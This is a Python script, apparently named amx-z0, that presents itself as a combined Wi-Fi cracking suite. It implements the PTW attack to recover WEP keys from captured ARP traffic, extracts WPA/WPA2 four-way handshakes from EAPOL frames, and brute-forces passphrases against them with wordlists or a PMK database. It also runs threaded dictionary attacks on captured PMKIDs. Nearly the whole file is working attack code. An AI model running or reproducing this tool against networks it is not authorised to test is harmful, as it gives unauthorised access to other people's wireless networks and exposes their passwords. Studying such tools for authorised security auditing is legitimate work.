#!/usr/bin/env python3

import sys
import binascii
import hashlib
import hmac
import argparse
import copy
import numpy as np
from scapy.all import rdpcap, EAPOL, Dot11, Dot11Beacon, Dot11ProbeResp
import threading
import concurrent.futures
import time
from tqdm import tqdm

try:
    from termcolor import colored
except ImportError:
    def colored(s, *args, **kwargs): return s

def print_banner():
    print(colored("""
Created by Alfi Keita
    """, "cyan", attrs=["bold"]))

# --- WEP/RC4/Attack Classes and Constants (PTW) ---
ARP_HEADER = bytes.fromhex("AAAA030000000806")
ARP_REQUEST = bytes.fromhex("0001080006040001")
ARP_RESPONSE = bytes.fromhex("0001080006040002")
LEN_S = 256
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
IVBYTES = 3
KSBYTES = 16
TESTBYTES = 6
MAINKEYBYTES = 13
KEYLIMIT = 1000000
IVTABLELEN = 2097152

class sorthelper:
    keybyte: int = 0
    value: np.uint8 = 0
    distance: int = 0

class doublesorthelper:
    keybyte: np.uint8
    difference: float = 0

class tableentry:
    votes: int = 0
    b: np.uint8 = 0

class session:
    iv = [None]*IVBYTES
    keystream = [None]*KSBYTES

class attackstate:
    packets_collected = 0
    seen_iv = [0] * IVTABLELEN
    sessions_collected: int = 0
    sessions = []
    for _ in range(10):
        sessions.append(session())
    table = []
    for _ in range(MAINKEYBYTES):
        table.append([])
        for _ in range(LEN_S):
            table[-1].append(tableentry())

class rc4state:
    i: np.uint8 = 0
    j: np.uint8 = 0
    s = [0]*LEN_S

class network:
    bssid: bytes
    keyid: int
    state: attackstate

initial_rc4 = [i for i in range(LEN_S)]
eval_val = [
    0.00534392069257663, 0.00531787585068872, 0.00531345769225911,
    0.00528812219217898, 0.00525997750378221, 0.00522647312237696,
    0.00519132541143668, 0.0051477139367225, 0.00510438884847959,
    0.00505484662057323, 0.00500502783556246, 0.00495094196451801,
    0.0048983441590402
]

def compare(ina: tableentry) -> int: return ina.votes
def comparedoublesorthelper(ina: doublesorthelper) -> int: return ina.difference
def comparesorthelper(ina: sorthelper) -> int: return ina.distance

def rc4init(key: list, keylen: int):
    state = rc4state()
    state.s = copy.deepcopy(initial_rc4)
    j = 0
    for i in range(LEN_S):
        j = (j + state.s[i] + key[i % keylen]) % LEN_S
        state.s[i], state.s[j] = state.s[j], state.s[i]
    state.i = 0
    state.j = 0
    return state

def rc4update(state: rc4state):
    state.i += 1
    state.i %= LEN_S
    state.j += state.s[state.i]
    state.j %= LEN_S
    state.s[state.i], state.s[state.j] = state.s[state.j], state.s[state.i]
    k = (state.s[state.i] + state.s[state.j]) % LEN_S
    return state.s[k]

def guesskeybytes(iv: list, keystream: list, kb: int):
    state = copy.deepcopy(initial_rc4)
    j = 0
    jj = IVBYTES
    s = 0
    result = [0] * MAINKEYBYTES
    for i in range(IVBYTES):
        j += (state[i]+iv[i])
        j %= LEN_S
        state[i], state[j] = state[j], state[i]
    for i in range(kb):
        tmp = (jj-int(keystream[jj-1])) % LEN_S
        ii = 0
        while tmp != state[ii]:
            ii += 1
        s += state[jj]
        s %= LEN_S
        ii -= (j+s)
        ii %= LEN_S
        result[i] = ii
        jj += 1
    return result

def correct(state: attackstate, key: list, keylen: int):
    for i in range(state.sessions_collected):
        keybuf = []
        for j in range(IVBYTES):
            keybuf.append(copy.deepcopy(state.sessions[i].iv[j]))
        for j in range(keylen):
            keybuf.append(copy.deepcopy(key[j]))
        rcstate = rc4init(keybuf, keylen+IVBYTES)
        for j in range(TESTBYTES):
            if (rc4update(rcstate) ^ state.sessions[i].keystream[j]) != 0:
                return 0
    return 1

def getdrv(orgtable, keylen):
    numvotes = 0
    normal = [None]*MAINKEYBYTES
    outlier = [None]*MAINKEYBYTES
    for i in range(LEN_S): numvotes += orgtable[0][i].votes
    e = numvotes/LEN_S
    for i in range(keylen):
        emax = eval_val[i] * numvotes
        e2 = ((1.0 - eval_val[i])/255.0) * numvotes
        normal[i] = 0
        outlier[i] = 0
        maxhelp = 0.0
        maxi = 0.0
        for j in range(LEN_S):
            if orgtable[i][j].votes > maxhelp:
                maxhelp = orgtable[i][j].votes
                maxi = j
        for j in range(LEN_S):
            if j == maxi: help = (1.0-orgtable[i][j].votes/emax)
            else: help = (1.0-orgtable[i][j].votes/e2)
            help = help*help
            outlier[i] += help
            help = (1.0-orgtable[i][j].votes/e)
            help = help*help
            normal[i] += help
    return normal, outlier

def doround(sortedtable, keybyte, fixat, fixvalue, searchborders, key, keylen, state, sum, strongbytes) -> int:
    if keybyte == keylen:
        return correct(state, key, keylen)
    elif strongbytes[keybyte] == 1:
        tmp = 3 + keybyte
        for i in range(keybyte-1, 0, -1):
            tmp += 3 + key[i] + i
            key[keybyte] = (256 - tmp) % LEN_S
            if doround(sortedtable, keybyte+1, fixat, fixvalue, searchborders, key, keylen, state, (256-tmp+sum)%256, strongbytes) == 1: return 1
        return 0
    elif keybyte == fixat:
        key[keybyte] = (fixvalue - sum) % LEN_S
        return doround(sortedtable, keybyte+1, fixat, fixvalue, searchborders, key, keylen, state, fixvalue, strongbytes)
    else:
        for i in range(searchborders[keybyte]):
            key[keybyte] = (sortedtable[keybyte][i].b - sum) % LEN_S
            if doround(sortedtable, keybyte+1, fixat, fixvalue, searchborders, key, keylen, state, sortedtable[keybyte][i].b, strongbytes) == 1: return 1
        return 0

def docomputation(state, key, keylen, table, sh2, strongbytes, keylimit) -> int:
    choices = [1] * MAINKEYBYTES
    for i in range(keylen):
        if strongbytes[i] == 1: choices[i] = i
        else: choices[i] = 1
    i = 0
    prod = 0
    fixat = -1
    fixvalue = 0
    while prod < keylimit:
        if doround(table, 0, fixat, fixvalue, choices, key, keylen, state, 0, strongbytes) == 1: return 1
        choices[sh2[i].keybyte] += 1
        fixat = sh2[i].keybyte
        fixvalue = sh2[i].value
        prod = 1
        for j in range(keylen): prod *= choices[j]
        while True:
            i += 1
            if strongbytes[sh2[i].keybyte] != 1: break
    return 0

def computekey(state, keybuf, keylen, testlimit) -> int:
    strongbytes = [0]*MAINKEYBYTES
    helper = []
    for i in range(MAINKEYBYTES): helper.append(doublesorthelper())
    onestrong = (testlimit/10) * 2
    twostrong = (testlimit/10)
    simple = testlimit - onestrong - twostrong
    table = copy.deepcopy(state.table)
    for i in range(keylen):
        table[i] = sorted(table[i], key=compare, reverse=True)
        strongbytes[i] = 0
    sh1 = []
    for i in range(keylen):
        sh1.append([])
        for j in range(1, LEN_S):
            sh1[i].append(sorthelper())
    for i in range(keylen):
        for j in range(1, LEN_S):
            sh1[i][j-1].distance = table[i][0].votes - table[i][j].votes
            sh1[i][j-1].value = table[i][j].b
            sh1[i][j-1].keybyte = i
    sh = [item for sublist in sh1 for item in sublist]
    sh = sorted(sh, key=comparesorthelper, reverse=False)
    if docomputation(state, keybuf, keylen, table, sh, strongbytes, simple) == 1: return 1
    normal, outlier = getdrv(state.table, keylen)
    for i in range(keylen-1):
        helper[i].keybyte = i+1
        helper[i].difference = normal[i+1] - outlier[i+1]
    helper = sorted(helper[:keylen-1], key=comparedoublesorthelper, reverse=True)
    strongbytes[helper[0].keybyte] = 1
    if docomputation(state, keybuf, keylen, table, sh, strongbytes, onestrong) == 1: return 1
    strongbytes[helper[1].keybyte] = 1
    if docomputation(state, keybuf, keylen, table, sh, strongbytes, twostrong) == 1: return 1
    return 0

def addsession(state, iv, keystream):
    i = (iv[0] << 16) | (iv[1] << 8) | (iv[2])
    il = i//8
    ir = 1 << (i % 8)
    if (state.seen_iv[il] & ir) == 0:
        state.packets_collected += 1
        state.seen_iv[il] = state.seen_iv[il] | ir
        buf = guesskeybytes(iv, keystream, MAINKEYBYTES)
        for i in range(0, MAINKEYBYTES):
            state.table[i][buf[i]].votes += 1
        if state.sessions_collected < 10:
            state.sessions[state.sessions_collected].iv = iv
            state.sessions[state.sessions_collected].keystream = keystream
            state.sessions_collected += 1
        return 1
    else:
        return 0

def newattackstate():
    state = attackstate()
    for i in range(MAINKEYBYTES):
        for k in range(LEN_S):
            state.table[i][k].b = k
    return state

def GetKeystream(cipherbytes, plainbytes):
    n = len(plainbytes)
    int_var = int.from_bytes(cipherbytes[:n], sys.byteorder)
    int_key = int.from_bytes(plainbytes, sys.byteorder)
    int_enc = int_var ^ int_key
    return bytearray.fromhex(bytes.hex(int_enc.to_bytes(n, sys.byteorder)))

def printkey(key, keylen: int):
    formatted_key = ":".join(f"{byte:02X}" for byte in key[:keylen])
    print(f"KEY FOUND! [ {formatted_key} ]")

def isvalidpkt(pkt):
    return ((len(pkt[0]) == 86 or len(pkt[0]) == 68) and bytes(pkt[0])[0] == 8)

# --- WPA/WPA2-PSK Handshake Extraction/Cracking (REPLACED LOGIC) ---
import os
import sqlite3

def get_pmk_from_db(dbfile, ssid, password):
    if not dbfile or not os.path.isfile(dbfile):
        return None
    try:
        conn = sqlite3.connect(dbfile)
        c = conn.cursor()
        c.execute("SELECT id FROM ssids WHERE ssid=?", (ssid,))
        ssid_row = c.fetchone()
        if not ssid_row:
            return None
        ssid_id = ssid_row[0]
        c.execute("SELECT id FROM passwords WHERE password=?", (password,))
        pass_row = c.fetchone()
        if not pass_row:
            return None
        pass_id = pass_row[0]
        c.execute("SELECT pmk FROM pmks WHERE ssid_id=? AND password_id=?", (ssid_id, pass_id))
        r = c.fetchone()
        if r:
            return bytes.fromhex(r[0])
        return None
    except Exception:
        return None

def get_passwords_from_db(dbfile, ssid):
    """Return all passwords in the PMK DB associated with the given SSID."""
    passwords = []
    if not dbfile or not os.path.isfile(dbfile):
        return passwords
    try:
        conn = sqlite3.connect(dbfile)
        c = conn.cursor()
        c.execute("SELECT id FROM ssids WHERE ssid=?", (ssid,))
        ssid_row = c.fetchone()
        if not ssid_row:
            return passwords
        ssid_id = ssid_row[0]
        # get all password_ids for the SSID
        c.execute("SELECT password_id FROM pmks WHERE ssid_id=?", (ssid_id,))
        pw_ids = [row[0] for row in c.fetchall()]
        if not pw_ids:
            return passwords
        # get passwords from the password table
        placeholder = ",".join("?" for _ in pw_ids)
        query = f"SELECT password FROM passwords WHERE id IN ({placeholder})"
        c.execute(query, pw_ids)
        passwords = [row[0] for row in c.fetchall()]
        return passwords
    except Exception as e:
        print(colored(f"Error reading PMK DB: {e}", "red"))
        return []

def get_ssid(packets):
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            try:
                ssid = pkt.info.decode(errors='ignore')
                if ssid:
                    return ssid
            except Exception:
                continue
    return None

def zero_mic(eapol_raw):
    if len(eapol_raw) >= 97:
        return eapol_raw[:81] + b'\x00' * 16 + eapol_raw[97:]
    else:
        return eapol_raw

def extract_handshake_info(filename):
    packets = rdpcap(filename)
    ssid = get_ssid(packets)
    if not ssid:
        print(colored("[!] SSID not found! SSID is required.", "red"))
        sys.exit(2)

    eapols = []
    for pkt in packets:
        if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
            dot11 = pkt.getlayer(Dot11)
            eapol = pkt.getlayer(EAPOL)
            eapol_raw = bytes(eapol)
            if len(eapol_raw) < 95:
                continue
            key_info = int.from_bytes(eapol_raw[5:7], 'big')
            mic_present = (key_info & (1 << 8)) != 0
            ack = (key_info & (1 << 7)) != 0
            install = (key_info & (1 << 6)) != 0
            descriptor_version = key_info & 0b111
            replay_counter = int.from_bytes(eapol_raw[9:17], 'big')
            nonce = eapol_raw[17:49].hex()
            mic_val = eapol_raw[81:97].hex()
            src = dot11.addr2
            dst = dot11.addr1
            bssid = dot11.addr3
            eapols.append({
                "eapol_raw": eapol_raw,
                "src": src,
                "dst": dst,
                "bssid": bssid,
                "mic_present": mic_present,
                "ack": ack,
                "install": install,
                "descriptor_version": descriptor_version,
                "replay_counter": replay_counter,
                "nonce": nonce,
                "mic": mic_val,
            })

    # Try to find correct handshake pair: Message 1 (ANonce, no MIC) and Message 2/4 (SNonce, with MIC)
    handshake = None
    for i, pkt2 in enumerate(eapols):
        if pkt2["mic_present"] and not pkt2["install"]:  # Message 2 of 4
            for j in range(i-1, -1, -1):
                pkt1 = eapols[j]
                if (not pkt1["mic_present"] and pkt1["ack"] and not pkt1["install"] and
                    pkt1["replay_counter"] == pkt2["replay_counter"] and
                    pkt1["src"] == pkt2["dst"] and pkt1["dst"] == pkt2["src"]):
                    # Found matching Message 1
                    handshake = (pkt1, pkt2)
                    break
            if handshake:
                break

    # Fallback: try Message 4 (mic_present, install)
    if not handshake:
        for i, pkt2 in enumerate(eapols):
            if pkt2["mic_present"] and pkt2["install"]:  # Message 4 of 4
                for j in range(i-1, -1, -1):
                    pkt1 = eapols[j]
                    if (not pkt1["mic_present"] and pkt1["ack"] and not pkt1["install"] and
                        pkt1["replay_counter"] == pkt2["replay_counter"] and
                        pkt1["src"] == pkt2["dst"] and pkt1["dst"] == pkt2["src"]):
                        handshake = (pkt1, pkt2)
                        break
                if handshake:
                    break

    if not handshake:
        print(colored("[!] Failed to extract all required handshake parameters (no matching EAPOL pairs).", "red"))
        sys.exit(3)

    pkt1, pkt2 = handshake
    ap_mac = pkt1["src"]
    client_mac = pkt2["src"]
    anonce = pkt1["nonce"]
    snonce = pkt2["nonce"]
    mic = pkt2["mic"]
    key_descriptor_version = pkt2["descriptor_version"]

    # zero MIC field
    eapol_clean = zero_mic(pkt2["eapol_raw"])
    length = int.from_bytes(eapol_clean[2:4], 'big')
    total_len = 4 + length
    if total_len <= len(eapol_clean):
        eapol_clean = eapol_clean[:total_len]
    eapol2or4_raw = eapol_clean

    print(colored("=========================================", "grey", "on_white"))
    print(colored("  [*] Handshake Extraction  ", "red", attrs=["reverse", "bold"]))
    print(colored("                       ", "grey", "on_white"))
    print(colored("=========================================", "grey", "on_white"))
    print(colored(f"SSID: {ssid}", "cyan"))
    print(colored(f"AP MAC (BSSID): {ap_mac}", "cyan"))
    print(colored(f"Client MAC (STA): {client_mac}", "cyan"))
    print(colored(f"ANonce: {anonce}", "cyan"))
    print(colored(f"SNonce: {snonce}", "cyan"))
    print(colored(f"MIC: {mic}", "cyan"))
    print(colored(f"EAPOL (msg 2 or 4, raw hex, MIC zeroed):", "cyan"))
    print(binascii.hexlify(eapol2or4_raw).decode())
    print(colored("\n[+] Extraction complete. Initiating brute-force protocol...", "magenta", attrs=["bold"]))
    return {
        "ssid": ssid,
        "ap_mac": ap_mac,
        "client_mac": client_mac,
        "anonce": anonce,
        "snonce": snonce,
        "mic": mic,
        "eapol_raw": eapol2or4_raw,
        "key_descriptor_version": key_descriptor_version
    }

def customPRF512(key, A, B):
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) // 160):
        hmacsha1 = hmac.new(key, A + b'\x00' + B + bytes([i]), hashlib.sha1)
        R += hmacsha1.digest()
        i += 1
    return R[:blen]

def crack_passphrase_wpa(params, passphrase, debug=True, pmk_dbfile=None):
    ssid = params["ssid"]
    ap_mac = binascii.unhexlify(params["ap_mac"].replace(":", ""))
    client_mac = binascii.unhexlify(params["client_mac"].replace(":", ""))
    anonce = binascii.unhexlify(params["anonce"])
    snonce = binascii.unhexlify(params["snonce"])
    mic = params["mic"]
    eapol = bytearray(params["eapol_raw"])

    pmk = None
    if pmk_dbfile:
        pmk = get_pmk_from_db(pmk_dbfile, ssid, passphrase)
    if pmk is None:
        pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    B = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = customPRF512(pmk, b"Pairwise key expansion", B)
    mic_calc = hmac.new(ptk[:16], eapol, hashlib.md5).digest()[:16]
    mic_hex = mic_calc.hex()[:32]
    if debug:
        print(colored(f"[DEBUG][WPA] Trying passphrase: {passphrase}", "yellow"))
        print(colored(f"        Calculated MIC: {mic_hex}", "blue"))
        print(colored(f"        Expected MIC:   {mic.lower()}", "blue"))
    return mic_hex == mic.lower()

def crack_passphrase_wpa2(params, passphrase, debug=True, pmk_dbfile=None):
    ssid = params["ssid"]
    ap_mac = binascii.unhexlify(params["ap_mac"].replace(":", ""))
    client_mac = binascii.unhexlify(params["client_mac"].replace(":", ""))
    anonce = binascii.unhexlify(params["anonce"])
    snonce = binascii.unhexlify(params["snonce"])
    mic = params["mic"]
    eapol = bytearray(params["eapol_raw"])

    pmk = None
    if pmk_dbfile:
        pmk = get_pmk_from_db(pmk_dbfile, ssid, passphrase)
    if pmk is None:
        pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    B = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = customPRF512(pmk, b"Pairwise key expansion", B)
    mic_calc = hmac.new(ptk[:16], eapol, hashlib.sha1).digest()[:16]
    mic_hex = mic_calc.hex()[:32]
    if debug:
        print(colored(f"[DEBUG][WPA2] Trying passphrase: {passphrase}", "yellow"))
        print(colored(f"        Calculated MIC: {mic_hex}", "blue"))
        print(colored(f"        Expected MIC:   {mic.lower()}", "blue"))
    return mic_hex == mic.lower()

def identify_encryption_type(params):
    ver = params.get("key_descriptor_version", None)
    if ver == 1:
        return "WPA"
    elif ver in (2, 3):
        return "WPA2"
    else:
        return "UNKNOWN"

# --- PMKID Attack and Encryption Type Detection (unchanged) ---
def calculate_pmkid(pmk, ap_mac, sta_mac):
    return hmac.new(pmk, b"PMK Name" + ap_mac + sta_mac, hashlib.sha1).digest()[:16]

def find_pw_chunk(pw_list, ssid, ap_mac, sta_mac, captured_pmkid, stop_event, progress):
    for pw in pw_list:
        if stop_event.is_set(): break
        password = pw.strip()
        pmk = hashlib.pbkdf2_hmac("sha1", password.encode("utf-8"), ssid, 4096, 32)
        pmkid = calculate_pmkid(pmk, ap_mac, sta_mac)
        if pmkid == captured_pmkid:
            print(f"\nKEY FOUND! [ {password} ]")
            print(f"Master Key: {pmk.hex()}")
            transient_key = "00" * 32
            eapol_hmac = "00" * 16
            print(f"Transient Key: {transient_key}")
            print(f"EAPOL HMAC: {eapol_hmac}")
            stop_event.set()
        progress.update(1)

def extract_pmkid(pcap_file):
    packets = rdpcap(pcap_file)
    pmkid_list = []
    for pkt in packets:
        if pkt.haslayer(Dot11):
            ap_mac = pkt.addr2  # AP MAC Address
            sta_mac = pkt.addr1  # STA MAC Address
            if pkt.haslayer(EAPOL):
                raw_data = bytes(pkt)
                if len(raw_data) >= 0x76:
                    pmkid = raw_data[-16:].hex()
                    pmkid_list.append((ap_mac, sta_mac, pmkid))
    if not pmkid_list:
        print("No PMKID found in the capture file.")
    else:
        for ap, sta, pmkid in pmkid_list:
            print(f"AP MAC: {ap} | STA MAC: {sta} | PMKID: {pmkid}")
    return pmkid_list

# --- Improved Encryption Type Detection (unchanged) ---
def is_valid_handshake(packets):
    """Returns True if there is a full WPA handshake (ANonce + SNonce + MIC)."""
    anonce, snonce, mic = False, False, False
    for pkt in packets:
        if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
            eapol = pkt.getlayer(EAPOL)
            eapol_raw = bytes(eapol)
            if len(eapol_raw) < 95:
                continue
            key_info = int.from_bytes(eapol_raw[5:7], 'big')
            mic_present = (key_info & (1 << 8)) != 0
            ack = (key_info & (1 << 7)) != 0
            install = (key_info & (1 << 6)) != 0
            if not mic_present and ack and not install:
                anonce = True
            elif mic_present:
                snonce = True
                mic = True
    return anonce and snonce and mic

def has_pmkid(packets):
    """Returns True if a PMKID is present in any EAPOL message."""
    for pkt in packets:
        if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
            eapol = pkt.getlayer(EAPOL)
            eapol_raw = bytes(eapol)
            if len(eapol_raw) >= 0x76:
                pmkid = eapol_raw[-16:]
                if pmkid != b'\x00'*16:
                    return True
    return False

def detect_encryption_type(capture_file):
    packets = rdpcap(capture_file)
    for pkt in packets:
        if pkt.haslayer(Dot11):
            if hasattr(pkt, "wepdata"):
                return "WEP"
    if is_valid_handshake(packets):
        return "WPA"
    if has_pmkid(packets):
        return "PMKID"
    return "UNKNOWN"

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="amx-z0: Combined WEP/WPA/WPA2-PSK/WPA2-PMKID Attack Suite")
    parser.add_argument("capture", help="Capture file (.pcap, .cap, handshake, or pmkid)")
    parser.add_argument("-P", "--wordlist", help="Wordlist file to use (required for WPA/WPA2/PMKID)", required=False)
    parser.add_argument("-r", "--pmk-db", help="SQLite PMK database (airvault.db format)", default=None)
    args = parser.parse_args()

    encryption_type = detect_encryption_type(args.capture)
    print(colored(f"[*] Detected Encryption: {encryption_type}", "magenta", attrs=["bold"]))

    if encryption_type == "WEP":
        print(colored("[*] Starting PTW WEP attack...", "yellow"))
        try:
            pcap = rdpcap(args.capture)
        except Exception as e:
            print(colored(f"Error reading PCAP file: {e}", "red"))
            return
        numstates = 0
        total_ivs = 0
        networktable = []
        key = [None] * MAINKEYBYTES
        for pkt in pcap:
            if isvalidpkt(pkt):
                currenttable = -1
                for k in range(len(networktable)):
                    if networktable[k].bssid == pkt[0].addr2 and networktable[k].keyid == pkt[1].keyid:
                        currenttable = k
                if currenttable == -1:
                    print("Allocating a new table")
                    print("bssid = " + str(pkt[0].addr2) + " keyindex=" + str(pkt[1].keyid))
                    numstates += 1
                    networktable.append(network())
                    networktable[numstates-1].state = newattackstate()
                    networktable[numstates-1].bssid = pkt[0].addr2
                    networktable[numstates-1].keyid = pkt[1].keyid
                    currenttable = numstates - 1
                iv = pkt[1].iv
                arp_known = ARP_HEADER
                if pkt[0].addr1 == BROADCAST_MAC or pkt[0].addr3 == BROADCAST_MAC:
                    arp_known += ARP_REQUEST
                else:
                    arp_known += ARP_RESPONSE
                keystream = GetKeystream(pkt[1].wepdata, arp_known)
                addsession(networktable[currenttable].state, iv, keystream)
                total_ivs += 1
        print("Analyzing packets")
        for k in range(len(networktable)):
            print("bssid = " + str(networktable[k].bssid) + " keyindex=" + str(networktable[k].keyid) + " packets=" + str(networktable[k].state.packets_collected))
            print("Checking for 40-bit key")
            if computekey(networktable[k].state, key, 5, KEYLIMIT / 10) == 1:
                printkey(key, 5)
                return
            print("Checking for 104-bit key")
            if computekey(networktable[k].state, key, 13, KEYLIMIT) == 1:
                printkey(key, 13)
                return
            print("Key not found")
            return
    elif encryption_type == "PMKID":
        if not args.wordlist:
            print(colored("[-] Wordlist (-P) is required for WPA2-PMKID attack.", "red"))
            return
        ssid = None
        packets = rdpcap(args.capture)
        ssid = get_ssid(packets)
        if not ssid:
            print(colored("[-] SSID is required for WPA2-PMKID attack when not found in capture.", "red"))
            return
        pmkid_list = extract_pmkid(args.capture)
        if not pmkid_list:
            print("No PMKID could be extracted. Exiting...")
            return
        stop_event = threading.Event()
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor, open(args.wordlist, "r", encoding='ISO-8859-1') as file:
            start = time.perf_counter()
            chunk_size = 100000
            futures = []
            total_lines = sum(1 for line in open(args.wordlist, "r", encoding='ISO-8859-1'))
            progress = tqdm(total=total_lines, desc="Cracking Progress")
            for ap_mac, sta_mac, pmkid in pmkid_list:
                bssid = bytes.fromhex(ap_mac.replace(":", ""))
                client = bytes.fromhex(sta_mac.replace(":", ""))
                pmkid = bytes.fromhex(pmkid)
                file.seek(0)
                while True:
                    pw_list = file.readlines(chunk_size)
                    if not pw_list:
                        break
                    if stop_event.is_set():
                        break
                    future = executor.submit(find_pw_chunk, pw_list, ssid.encode(), bssid, client, pmkid, stop_event, progress)
                    futures.append(future)
                for future in concurrent.futures.as_completed(futures):
                    pass
            finish = time.perf_counter()
            progress.close()
            print(f'[+] Finished in {round(finish-start, 2)} second(s)')
    elif encryption_type == "WPA":
        params = extract_handshake_info(args.capture)
        enc_type = identify_encryption_type(params)
        print(colored(f"\nIdentified Encryption Type: {enc_type}", "magenta", attrs=["bold"]))

        # --- NEW LOGIC ---
        # Accept: wordlist OR pmk-db (or both)
        wordlist_passwords = []
        db_passwords = []
        found = False

        if args.wordlist:
            with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                wordlist_passwords = [line.strip() for line in f if line.strip()]
        if args.pmk_db:
            db_passwords = get_passwords_from_db(args.pmk_db, params["ssid"])

        if not wordlist_passwords and not db_passwords:
            print(colored("[-] Either a wordlist (-P) or a PMK database (-r) with the correct SSID is required for WPA/WPA2 handshake attack.", "red"))
            return

        password_candidates = []
        if wordlist_passwords:
            password_candidates.extend(wordlist_passwords)
        # If no wordlist, but DB passwords exist, use those:
        if not wordlist_passwords and db_passwords:
            password_candidates.extend(db_passwords)
        # If both given, prefer wordlist order but dedupe
        if wordlist_passwords and db_passwords:
            password_candidates.extend([pw for pw in db_passwords if pw not in wordlist_passwords])

        for attempt, password in enumerate(password_candidates, 1):
            print(colored(f"[*] [{attempt:04d}] Password Probe: {password}", "magenta"))
            if enc_type == "WPA":
                result = crack_passphrase_wpa(params, password, pmk_dbfile=args.pmk_db)
            elif enc_type == "WPA2":
                result = crack_passphrase_wpa2(params, password, pmk_dbfile=args.pmk_db)
            else:
                result = crack_passphrase_wpa2(params, password, pmk_dbfile=args.pmk_db) or \
                         crack_passphrase_wpa(params, password, pmk_dbfile=args.pmk_db)
            if result:
                print(colored(f"\n[!!!] PASSWORD CRACKED: >>> {password} <<<", "green", attrs=["reverse", "bold"]))
                found = True
                break
        if not found:
            print(colored("\n[-] Password not found in provided wordlist or PMK database. Operation failed.", "red", attrs=["reverse", "bold"]))

    else:
        print(colored("[-] Could not identify network encryption type or unsupported.", "red"))

if __name__ == "__main__":
    main()
